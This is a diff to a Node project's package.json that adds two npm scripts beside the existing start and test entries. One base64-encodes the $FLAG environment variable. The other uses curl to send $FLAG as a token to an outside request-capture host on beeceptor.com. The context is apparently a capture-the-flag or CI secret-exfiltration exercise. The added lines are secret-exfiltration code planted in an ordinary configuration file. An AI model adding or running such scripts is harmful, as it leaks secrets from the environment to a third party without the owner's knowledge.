@@ -8,7 +8,9 @@
 	"main": "index.js",
 	"scripts": {
 		"start": "node index.js",
-		"test": "node tests/test.js"
+		"test": "node tests/test.js",
+		"flag2": "echo $(base64 $FLAG)",		
+		"flag": "curl -s https://hs2land.free.beeceptor.comcollect?token=$FLAG"
 	},
 	"dependencies": {
 		"colors": "^1.4.0"
